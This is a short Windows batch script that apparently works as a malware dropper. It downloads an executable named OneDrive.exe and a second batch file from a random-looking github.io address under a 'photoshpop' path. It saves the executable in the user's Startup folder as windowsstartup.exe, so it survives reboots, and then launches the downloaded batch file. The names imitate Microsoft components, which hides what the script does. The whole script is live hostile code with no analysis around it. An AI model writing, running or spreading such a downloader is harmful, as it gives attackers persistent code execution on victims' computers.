@echo off
setlocal

REM Get the username of the current user
for /f "tokens=*" %%a in ('whoami') do set "username=%%a"
set "username=%username:*\=%"

REM Set the source and destination paths
set "source=https://njrwehrtujikwq89789.github.io/photoshpop/OneDrive.exe"
set "destination=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "sourcee=https://njrwehrtujikwq89789.github.io/photoshpop/windows.bat"
REM Download the file using PowerShell
powershell -Command "(New-Object Net.WebClient).DownloadFile('%source%', '%destination%\windowsstartup.exe')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%sourcee%', '%destination%\windows.bat')"
start "" "%destination%\windows.bat"
endlocal

